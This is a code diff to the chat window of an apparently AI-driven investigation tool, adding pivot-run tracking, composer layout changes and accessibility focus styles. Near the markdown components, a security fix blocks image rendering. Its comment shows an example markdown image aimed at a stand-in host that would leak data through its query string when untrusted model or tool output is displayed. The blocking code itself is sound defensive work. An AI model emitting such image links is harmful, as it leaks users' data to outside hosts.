@@ -4,6 +4,7 @@ import { useChat } from "@ai-sdk/react";
 import { DefaultChatTransport, type UIMessage } from "ai";
 import { supabase, SUPABASE_URL } from "@/integrations/supabase/client";
 import { useAuth } from "@/hooks/useAuth";
+import { useComposerFocus } from "@/hooks/useComposerFocus";
 import ReactMarkdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { reflowCollapsedTables } from "@/lib/markdown";
@@ -22,21 +23,24 @@ import { checkCachedHitSafety, useReviewStates, type ReviewState } from "@/lib/r
 import { buildDecisionSets, isManualDispatchRefused } from "@/lib/analyst-decisions";
 import { KIND_TO_PIVOT } from "@/lib/intel";
 import { useThreadArtifacts } from "@/hooks/useThreadArtifacts";
-import { useThreadQueriedTargets } from "@/hooks/useThreadQueriedTargets";
+import { queriedTargetSet, useThreadQueriedCalls } from "@/hooks/useThreadQueriedTargets";
 import { useThreadPivotAttempts } from "@/hooks/useThreadPivotAttempts";
 import { isSubmitBlocked, submitRefusal, submitRefusalMessage } from "@/lib/submit-guard";
 import { messageIntegrity, narrativeIsUnadjudicated } from "@/lib/message-integrity";
 import { RunChips, RunMenu } from "@/components/pivots/RunControls";
 import { composerPrimary } from "@/lib/composer-primary";
 import { useIsMobile } from "@/hooks/use-mobile";
+import { useIsWorkbenchViewport } from "@/hooks/useIsWorkbenchViewport";
 import { useOptionalCaseSnapshot } from "@/hooks/useCaseSnapshot";
 import {
   AUTO_RUN_MAX_CYCLES, AUTO_RUN_OVERLAP_MAX_WAIT_MS, AUTO_RUN_OVERLAP_POLL_MS, AUTO_RUN_SETTLE_MS, CONTINUE_PROMPT, REPORT_PROMPT,
   autoRunStopMessage, canShowRunControls, decideAutoContinue,
 } from "@/lib/run-controls";
 import { cardDedupeKey, normalizeTarget } from "@/lib/next-step-cards";
+import { closeLatestPivotRun, derivePivotRunViews, pivotRunKey, pivotSendHooks, usePivotRuns } from "@/lib/pivot-runs";
 import { pivotEligibility, pivotSuggestionInput, validatePivotSuggestion, type RunnablePivot } from "@/lib/pivot-schema";
 import { NextSteps, type NextStepItem } from "@/components/pivots/NextSteps";
+import { countWorkbenchRunnablePivots } from "@/lib/next-step-queue";
 import { registerPivotRunner } from "@/lib/pivot-runner";
 import { DEFAULT_CONTROLS, evaluatePreflight, type PreflightControls } from "@/lib/composer-preflight";
 import { TargetChip } from "@/components/composer/ComposerPreflight";
@@ -203,11 +207,21 @@ function CodePanel({
         </span>
         <div className="code-panel__head-actions">
           {isLong && (
-            <button type="button" onClick={() => setExpanded((v) => !v)}>
+            <button
+              type="button"
+              onClick={() => setExpanded((v) => !v)}
+              className="rounded focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-1"
+            >
               {expanded ? "Collapse" : "Expand"}
             </button>
           )}
-          <button type="button" onClick={onCopy}>Copy</button>
+          <button
+            type="button"
+            onClick={onCopy}
+            className="rounded focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-1"
+          >
+            Copy
+          </button>
         </div>
       </div>
       <div className={cn("code-panel__body", expanded && "code-panel__body--expanded")}>
@@ -335,7 +349,7 @@ function ToolPart({ part: rawPart, createdAt }: { part: ToolPartShape | null | u
         type="button"
         onClick={() => setOpen((o) => !o)}
         aria-expanded={open}
-        className="grid w-full grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-x-3 gap-y-1 px-4 py-3 text-left"
+        className="grid w-full grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-x-3 gap-y-1 px-4 py-3 text-left focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-inset"
       >
         <span
           className={cn(
@@ -1003,7 +1017,39 @@ const chatMarkdownComponents: Components = {
   ),
   th: ({ node, children, ...rest }) => <th {...rest}>{children}</th>,
   td: ({ node, children, ...rest }) => <td {...rest}>{wrapChildren(children)}</td>,
+  // Never load a markdown image (audit SEC-05). Model and tool text is
+  // untrusted: `![](https://host/p.png?d=…)` would fetch on paint and hand the
+  // query string to that host. Disclose it as plain text instead, with no link,
+  // so nothing is fetched or one click away. Analyst uploads are a direct <img>
+  // in MessageViewImpl and do not pass through here.
+  img: ({ alt, src, title }) => <BlockedImage alt={alt} src={src} title={title} />,
 };
+
+const BLOCKED_IMAGE_SRC_MAX = 80;
+
+// Where the model pointed is part of the disclosure. A protocol-relative or
+// data: src has no usable hostname, so fall back to the raw text (truncated,
+// never a link) rather than hiding the target.
+function blockedImageTarget(src?: string): string {
+  if (!src) return "";
+  try {
+    const host = new URL(src).hostname;
+    if (host) return host;
+  } catch {
+    // not an absolute URL
+  }
+  const raw = src.trim();
+  return raw.length > BLOCKED_IMAGE_SRC_MAX ? `${raw.slice(0, BLOCKED_IMAGE_SRC_MAX)}…` : raw;
+}
+
+function BlockedImage({ alt, src, title }: { alt?: string; src?: string; title?: string }) {
+  const target = blockedImageTarget(src);
+  return (
+    <span className="chat-blocked-image text-muted-foreground">
+      [image not loaded{alt ? `: ${alt}` : ""}{title ? ` ("${title}")` : ""}{target ? ` · ${target}` : ""}]
+    </span>
+  );
+}
 
 const CHAT_REMARK_PLUGINS = [remarkGfm];
 
@@ -1446,7 +1492,10 @@ function ChatWindowInner({
   // Preflight around the free-form request: the parsed target and the analyst's
   // correction of its type (see composer-preflight.ts).
   const [controls, setControls] = useState<PreflightControls>(DEFAULT_CONTROLS);
-  const [composerFocused, setComposerFocused] = useState(false);
+  // Focus for the whole composer shell. A blur caused by a click elsewhere is
+  // applied only after that click completes, so the idle collapse below never
+  // moves the transcript under a pointer that is still down (useComposerFocus).
+  const { focused: composerFocused, onFocus: onComposerFocus, onBlur: onComposerBlur } = useComposerFocus();
   // Which Next-steps row has its run preview open (see NextSteps).
   const [openStep, setOpenStep] = useState<string | null>(null);
   const composerIds = { textarea: useId(), help: useId() };
@@ -1487,18 +1536,34 @@ function ChatWindowInner({
   const submitLockRef = useRef(false);
   const [rerunBusy, setRerunBusy] = useState(false);
   const { items: artifacts } = useThreadArtifacts(threadId);
+  // Read at send time to anchor pivot-run windows on server timestamps.
+  const artifactsRef = useRef(artifacts);
+  artifactsRef.current = artifacts;
+  // Any send that is not a pivot's own ends the latest pivot's claim to the run.
+  // The withdraw hook of the pivot whose send is in flight, so a send the SDK
+  // routes to onError (a 409 for a server-held run, a dead stream) takes its
+  // Running card down with it. Cleared by any non-pivot send.
+  const pivotFailRef = useRef<(() => void) | null>(null);
+  const closePivotRun = useCallback(() => {
+    pivotFailRef.current = null;
+    closeLatestPivotRun(threadId, artifactsRef.current);
+  }, [threadId]);
   // Optional: absent in standalone renders/tests. Used only to keep the run
   // controls off a thread whose run is live in another tab (overlap guard).
   const caseSnapshot = useOptionalCaseSnapshot();
   const serverRunActive = caseSnapshot?.snapshot?.run.state === "running";
   const serverRunStartedAt = caseSnapshot?.snapshot?.run.startedAt ?? null;
+  // Pivots this tab started: they leave the Next-steps queue and show above it
+  // as Running, then Completed (see lib/pivot-runs.ts).
+  const pivotRuns = usePivotRuns(threadId);
   // Read at CALL time (delayed auto-continue, send guards) so a callback built
   // while a run was live does not keep refusing after it ends.
   const serverRunActiveRef = useRef(serverRunActive);
   serverRunActiveRef.current = serverRunActive;
   // Targets tools have already been run against — the "already investigated"
   // signal that stops the rail re-suggesting a pivot that's already been run.
-  const queriedTargets = useThreadQueriedTargets(threadId);
+  const queriedCalls = useThreadQueriedCalls(threadId);
+  const queriedTargets = useMemo(() => queriedTargetSet(queriedCalls), [queriedCalls]);
   // Prior tool attempts per selector — read-only input to the adaptive ranking.
   const pivotAttempts = useThreadPivotAttempts(threadId);
   // Analyst decisions. They shape the "Next steps" rail (a rejected selector is
@@ -1622,6 +1687,13 @@ function ChatWindowInner({
     transport,
     onError: async (e) => {
       if (!user || failSavedRef.current) return;
+      // Read synchronously: the failing send is still the current one here,
+      // and nothing can replace it before the first await below.
+      const withdrawPivot = pivotFailRef.current;
+      const failPivotSend = () => {
+        withdrawPivot?.();
+        if (pivotFailRef.current === withdrawPivot) pivotFailRef.current = null;
+      };
       // Ignore aborts caused by the user navigating away — the run continues
       // in the background and onFinish will save the assistant message.
       const msg = String(e?.message ?? "");
@@ -1637,6 +1709,7 @@ function ChatWindowInner({
       // A provider's 401 surfaced mid-stream ("…rejected the API key (401)…") is NOT the
       // analyst's session and must never sign them out (lib/tool-run.ts isTransportAuthFailure).
       if (isTransportAuthFailure(e)) {
+        failPivotSend();
         toast.error(friendly);
         navigate("/auth");
         return;
@@ -1706,6 +1779,8 @@ function ChatWindowInner({
         // through to persist the marker, exactly as before this branch existed.
         if (suppressedDropErrorRef.current === e) markDropSuppressed(null);
       }
+      // The send is dead, so the pivot it carried goes back to the queue.
+      failPivotSend();
       // Persist a failed assistant marker so reload shows the failed card
       await supabase.from("messages").insert({
         thread_id: threadId,
@@ -2076,6 +2151,7 @@ function ChatWindowInner({
     setControls(DEFAULT_CONTROLS);
     try {
       await beginInvestigation();
+      closePivotRun();
       await sendMessage({ text: composed });
     } catch (e) {
       // useChat's onError only fires for stream errors. Pre-stream failures
@@ -2149,20 +2225,29 @@ function ChatWindowInner({
   };
 
   // Send arbitrary text without going through the input (used by pivots + suggestions).
-  const sendText = useCallback(async (text: string) => {
+  // `hooks` let a pivot be recorded only once its send is accepted, and withdrawn
+  // if the send then rejects (see pivotSendHooks). A blocked send calls neither.
+  const sendText = useCallback(async (text: string, hooks?: { onAccepted?: () => void; onFailed?: () => void }) => {
     const t = text.trim();
     if (!t || isSubmitBlocked(status, submitLockRef.current, serverRunActiveRef.current)) return;
     submitLockRef.current = true;
+    let accepted = false;
     try {
       await beginInvestigation();
+      accepted = true;
+      if (hooks?.onAccepted) {
+        hooks.onAccepted();
+        pivotFailRef.current = hooks.onFailed ?? null;
+      } else closePivotRun();
       await sendMessage({ text: t });
     } catch (e) {
+      if (accepted) hooks?.onFailed?.();
       console.error("sendText failed:", e);
       toast.error(`Failed to send message: ${describeTransportError(e)}`);
     } finally {
       submitLockRef.current = false;
     }
-  }, [beginInvestigation, sendMessage, status]);
+  }, [beginInvestigation, closePivotRun, sendMessage, status]);
 
   // --- Run controls -------------------------------------------------------
   // Continue = one more cycle. Auto-run = keep cycling while each cycle still
@@ -2193,13 +2278,19 @@ function ChatWindowInner({
       return;
     }
     stoppedByAnalystRef.current = false;
+    // Recorded only once sendText accepts the send, so a cycle that never
+    // started is never shown as a running pivot.
+    const autoPivot = autoPivotRef.current;
+    const hooks = countAsAutoCycle && autoPivot && prompt === autoPivot.prompt
+      ? pivotSendHooks(threadId, { ...autoPivot, origin: "auto" }, () => artifactsRef.current)
+      : undefined;
     setAutoRun((prev) => ({
       ...prev,
       cyclesRun: countAsAutoCycle ? prev.cyclesRun + 1 : prev.cyclesRun,
       artifactsBefore: artifactsCountRef.current,
     }));
-    await sendText(prompt);
-  }, [sendText, status]);
+    await sendText(prompt, hooks);
+  }, [sendText, status, threadId]);
   const runContinue = useCallback(() => { void sendCycle(CONTINUE_PROMPT, false); }, [sendCycle]);
   const runWriteReport = useCallback(() => {
     // A report request is the natural end of Auto-run.
@@ -2222,7 +2313,7 @@ function ChatWindowInner({
   // Listen for "run pivot" events dispatched from the Pivots tab.
   useEffect(() => {
     const onRunPivot = (e: Event) => {
-      const detail = (e as CustomEvent<{ threadId: string; value: string; type?: string; prompt?: string }>).detail;
+      const detail = (e as CustomEvent<{ threadId: string; value: string; type?: string; prompt?: string; action?: string }>).detail;
       if (!detail || detail.threadId !== threadId) return;
       // MANUAL DISPATCH GUARD. Every surface that runs a pivot — the Pivots
       // tab, "queue all", the command palette, a Recheck launch — rides this
@@ -2239,14 +2330,23 @@ function ChatWindowInner({
       }
       // A run already in flight holds the submit lock, and sendText would drop
       // this pivot without a word. Say so instead.
-      if (isSubmitBlocked(status, submitLockRef.current)) {
+      // Same three-argument check sendText applies, so a run the server still
+      // holds (after a reload or a dropped stream) is refused here, out loud,
+      // instead of toasting "sent" for a send sendText then drops.
+      if (isSubmitBlocked(status, submitLockRef.current, serverRunActiveRef.current)) {
         toast.info("A run is in progress on this case. Start the pivot when it finishes.");
         return;
       }
       const prompt = detail.prompt ??
         `Pivot on ${detail.value}${detail.type ? ` (${detail.type})` : ""}. Run the next investigation step on this lead.`;
       toast.success(`Pivot on ${detail.value} sent to the agent`);
-      void sendText(prompt);
+      // Past the dispatch guard and the submit lock; recorded once sendText
+      // accepts the send, withdrawn if it then rejects.
+      void sendText(prompt, pivotSendHooks(
+        threadId,
+        { target: detail.value, targetType: detail.type, action: detail.action ?? "Pivot", origin: "manual" },
+        () => artifactsRef.current,
+      ));
     };
     window.addEventListener("proximity:run-pivot", onRunPivot as EventListener);
     // Tell the Pivots surface that something on this page can actually run a
@@ -2263,7 +2363,7 @@ function ChatWindowInner({
   // sendText directly and skip that refusal.
   const runPivotFromRail = useCallback((p: RunnablePivot) => {
     window.dispatchEvent(new CustomEvent("proximity:run-pivot", {
-      detail: { threadId, value: p.target, type: p.targetType, prompt: p.prompt },
+      detail: { threadId, value: p.target, type: p.targetType, prompt: p.prompt, action: p.action },
     }));
   }, [threadId]);
 
@@ -2430,6 +2530,7 @@ function ChatWindowInner({
       }
       setMessages((prev) => prev.filter((m) => !(m.role === "assistant" && (m.parts as MessagePartShape[]).some((p) => p?.type === CACHE_BANNER_TYPE))));
       await beginInvestigation();
+      closePivotRun();
       await sendMessage({ text });
     } finally {
       setRerunBusy(false);
@@ -2478,6 +2579,7 @@ function ChatWindowInner({
       return out;
     });
     await beginInvestigation();
+    closePivotRun();
     await sendMessage({ text });
     } catch (e) {
       console.error("retry failed:", e);
@@ -2512,6 +2614,11 @@ function ChatWindowInner({
   );
   // Placeholder length only — layout is CSS-responsive and never remounts.
   const isPhone = useIsMobile();
+  // When the Workbench's right-hand Next tab is visible (xl+), the actionable
+  // pivot queue lives there — the transcript shows a compact summary + handoff
+  // button to avoid duplicating Run affordances. Below xl, the Workbench aside
+  // is `display:none`, so the transcript keeps the full NextSteps as fallback.
+  const workbenchVisible = useIsWorkbenchViewport();
   const runControlsVisible = canShowRunControls({
     isLoading,
     hasAssistantTurn: messages.some((m) => m.role === "assistant"),
@@ -2529,6 +2636,10 @@ function ChatWindowInner({
     canSubmit: preflight.canSubmit,
     uploading,
   });
+  // Idle, empty and no attachments: the label row hides and the actions sit on
+  // the textarea's own line, which gives the transcript ~100px back on short
+  // windows. Any focus inside the composer, or any text, restores the full box.
+  const compactComposer = !isPhone && !composerFocused && !input && attachments.length === 0;
   // Auto-grow the request box: one calm line when idle and empty, up to ~8
   // lines while writing. Height is set on the element so it never reflows the
   // transcript above more than the text itself needs.
@@ -2844,6 +2955,17 @@ function ChatWindowInner({
   // Build suggested next-step replies after the agent stops streaming.
   // Memoized — without this the IIFE re-runs on every streamed token because
   // `messages` updates dozens of times per second during streaming.
+  const pivotRunViews = useMemo(
+    () => derivePivotRunViews(pivotRuns, { caseRunning: isLoading || serverRunActive, artifacts, queriedCalls }),
+    [pivotRuns, isLoading, serverRunActive, artifacts, queriedCalls],
+  );
+  // A pivot leaves the suggestions while it runs or once a tool call was
+  // recorded against it. An ended run with none (stopped, errored, never
+  // reached) puts it back: that pivot is unknown, not done.
+  const sentPivotKeys = useMemo(
+    () => new Set(pivotRunViews.filter((v) => v.phase !== "ended").map((v) => v.run.key)),
+    [pivotRunViews],
+  );
   const suggestions = useMemo(() => {
     if (isLoading || messages.length === 0) return [] as NextStepItem[];
     // Wait for every input the ranking depends on, so the list is stable when shown.
@@ -2884,7 +3006,7 @@ function ChatWindowInner({
     // collected (bounded) and shown behind one disclosure line by NextSteps.
     const repair: NextStepItem[] = [];
     let runnable = 0;
-    for (const p of ranked.filter((candidate) => candidate.status === "new")) {
+    for (const p of ranked.filter((candidate) => candidate.status === "new" && !sentPivotKeys.has(pivotRunKey(candidate.type, candidate.value)))) {
       if (runnable >= 3) break;
       const dedupe = cardDedupeKey({ title: p.actionLabel, target: p.value });
       if (seenKeys.has(dedupe)) continue;
@@ -2917,7 +3039,15 @@ function ChatWindowInner({
       out.push({ kind: "action", key: `action:${g.title}`, title: g.title, detail: g.detail, prompt: g.prompt });
     }
     return [...out.slice(0, 4), ...repair];
-  }, [isLoading, messages, artifacts, seedValue, seedLoaded, reportPivots, pivotSkip, queriedTargets, pivotAttempts, review.map, review.availability]);
+  }, [isLoading, messages, artifacts, seedValue, seedLoaded, reportPivots, pivotSkip, queriedTargets, pivotAttempts, review.map, review.availability, sentPivotKeys]);
+
+  // The Workbench's Next-tab runnable count — the number the transcript's
+  // compact handoff line prints. Different from `suggestions.length` because
+  // the Workbench caps at WORKBENCH_RUNNABLE_LIMIT (5) and never injects the
+  // transcript's "Summarize / Breach check / Find more" fallback actions.
+  const workbenchRunnableCount = useMemo(() => countWorkbenchRunnablePivots({
+    artifacts, seedValue, reportPivots, skipSet: pivotSkip, queriedSet: queriedTargets, reviews: review.map,
+  }), [artifacts, seedValue, reportPivots, pivotSkip, queriedTargets, review.map]);
 
   // The pivot Auto-run would start next. Read from a ref at cycle time, because
   // the cycle effect fires between renders. A pivot Auto-run already sent this
@@ -3100,17 +3230,52 @@ function ChatWindowInner({
             <FailedRunCard reason={error.message} onRetry={retryLastUser} />
           )}
           {suggestions.length > 0 && (
-            <NextSteps
-              items={suggestions}
-              onRunPivot={runPivotFromRail}
-              onRunAction={(prompt) => void sendText(prompt)}
-              busy={isLoading}
-              openKey={openStep}
-              onOpenChange={setOpenStep}
-              connections={connections}
-              artifactsById={artifactsByIdMemo}
-              onOpenGraph={() => window.dispatchEvent(new CustomEvent("swarmbot:navigate", { detail: { tab: "graph" } }))}
-            />
+            workbenchVisible ? (
+              // Workbench's Next tab owns the live queue. In the transcript we
+              // show a quiet handoff — the exact pivot cards, Run buttons and
+              // Preview flow live on the right so the analyst isn't offered
+              // the same action twice. The number names the Workbench Next
+              // tab's exact runnable count (via `countWorkbenchRunnablePivots`),
+              // not the local `suggestions` list which also carries generic
+              // fallback actions ("Summarize", "Find more") the Workbench
+              // doesn't offer. Below xl the full NextSteps renders (fallback)
+              // because the Workbench is hidden.
+              <aside
+                aria-label="Next pivots summary"
+                className="rounded-lg border border-border-subtle bg-surface-2/60 px-4 py-3"
+              >
+                <div className="flex flex-wrap items-center justify-between gap-2">
+                  <span className="text-data text-muted-foreground">
+                    {workbenchRunnableCount === 1
+                      ? "1 next pivot ranked"
+                      : `${workbenchRunnableCount} next pivots ranked`}
+                    <span className="mx-1.5 text-faint-foreground">·</span>
+                    open the workbench to Preview and Run
+                  </span>
+                  <button
+                    type="button"
+                    onClick={() => window.dispatchEvent(new CustomEvent("swarmbot:workbench-tab", { detail: { tab: "next" } }))}
+                    className="inline-flex h-7 items-center rounded-md border border-border-subtle bg-surface-3 px-2.5 text-data font-medium text-foreground transition-colors hover:bg-surface-4 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
+                  >
+                    Open Next pivots
+                  </button>
+                </div>
+              </aside>
+            ) : (
+              <NextSteps
+                items={suggestions}
+                onRunPivot={runPivotFromRail}
+                onRunAction={(prompt) => void sendText(prompt)}
+                busy={isLoading}
+                runs={pivotRunViews}
+                onViewChanges={(artifactId) => window.dispatchEvent(new CustomEvent("swarmbot:navigate", { detail: { tab: "artifacts", artifactId } }))}
+                openKey={openStep}
+                onOpenChange={setOpenStep}
+                connections={connections}
+                artifactsById={artifactsByIdMemo}
+                onOpenGraph={() => window.dispatchEvent(new CustomEvent("swarmbot:navigate", { detail: { tab: "graph" } }))}
+              />
+            )
           )}
           <div ref={endRef} />
         </div>
@@ -3164,7 +3329,16 @@ function ChatWindowInner({
               })}
             </div>
           )}
-          <div className="composer-shell">
+          <div
+            className="composer-shell"
+            data-compact={compactComposer || undefined}
+            // Focus is tracked for the whole shell, not the textarea alone, so
+            // tabbing from the box to Continue does not collapse the row under
+            // the keyboard; a click elsewhere collapses it only once the click
+            // has landed (see useComposerFocus).
+            onFocus={onComposerFocus}
+            onBlur={onComposerBlur}
+          >
             <input
               ref={fileInputRef}
               type="file"
@@ -3175,7 +3349,7 @@ function ChatWindowInner({
             />
             {/* Label row. Visually hidden on a phone, where the composer is one
                 line, but still the textarea's accessible name. */}
-            <div className="flex items-center justify-between gap-2 px-3 pt-2 max-sm:sr-only">
+            <div className={cn("flex items-center justify-between gap-2 px-3 pt-2 max-sm:sr-only", compactComposer && "sr-only")}>
               <label htmlFor={composerIds.textarea} className="text-data font-medium text-foreground/90">
                 {isFollowUp ? "Message this case" : "Investigation request"}
               </label>
@@ -3185,7 +3359,7 @@ function ChatWindowInner({
                   : <><kbd className="font-sans">⌘/Ctrl</kbd> + <kbd className="font-sans">Enter</kbd> to {isFollowUp ? "send" : "start"} · Enter for a new line</>}
               </span>
             </div>
-            <div className="flex items-end gap-1 p-1.5 sm:block sm:p-0">
+            <div className={cn("flex items-end gap-1 p-1.5 sm:p-0", compactComposer ? "sm:flex sm:items-center sm:py-1" : "sm:block")}>
               <Button
                 type="button"
                 variant="ghost"
@@ -3202,8 +3376,6 @@ function ChatWindowInner({
                 id={composerIds.textarea}
                 value={input}
                 onChange={(e) => setInput(e.target.value)}
-                onFocus={() => setComposerFocused(true)}
-                onBlur={() => setComposerFocused(false)}
                 onKeyDown={(e) => {
                   // Enter writes a new line; Cmd/Ctrl+Enter runs the primary
                   // action — Continue on an open case with an empty box, else
@@ -3228,7 +3400,7 @@ function ChatWindowInner({
                 spellCheck={false}
                 className="min-h-[44px] max-h-52 min-w-0 flex-1 font-chat bg-transparent border-0 resize-none overflow-y-auto focus-visible:ring-0 focus-visible:ring-offset-0 px-1 py-2.5 text-[16px] leading-6 tracking-[-0.01em] placeholder:text-muted-foreground/70 sm:px-3 sm:py-2 sm:text-body"
               />
-              <div className="flex shrink-0 items-center gap-1 sm:gap-1.5 sm:px-2 sm:pb-2">
+              <div className={cn("flex shrink-0 items-center gap-1 sm:gap-1.5 sm:px-2", compactComposer ? "sm:pb-0" : "sm:pb-2")}>
                 <Button
                   type="button"
                   variant="ghost"
@@ -3319,13 +3491,15 @@ function ChatWindowInner({
           >
             {preflight.errors.target
               ? preflight.errors.target
-              : preflight.empty
-                ? primary.kind === "continue"
-                  ? "Continue runs the next best pivots and reports only what is new — or ask anything about this case."
-                  : isFollowUp
-                    ? "Ask about this case, or name a new selector to pivot on."
-                    : "Enter one primary target, then state the question you need answered."
-                : `Target: ${preflight.summary.target}`}
+              : primary.kind === "stop"
+                ? "Agent working — press Stop to end this run."
+                : preflight.empty
+                  ? primary.kind === "continue"
+                    ? "Continue runs the next best pivots and reports only what is new — or ask anything about this case."
+                    : isFollowUp
+                      ? "Ask about this case, or name a new selector to pivot on."
+                      : "Enter one primary target, then state the question you need answered."
+                  : `Target: ${preflight.summary.target}`}
           </p>
         </div>
       </div>
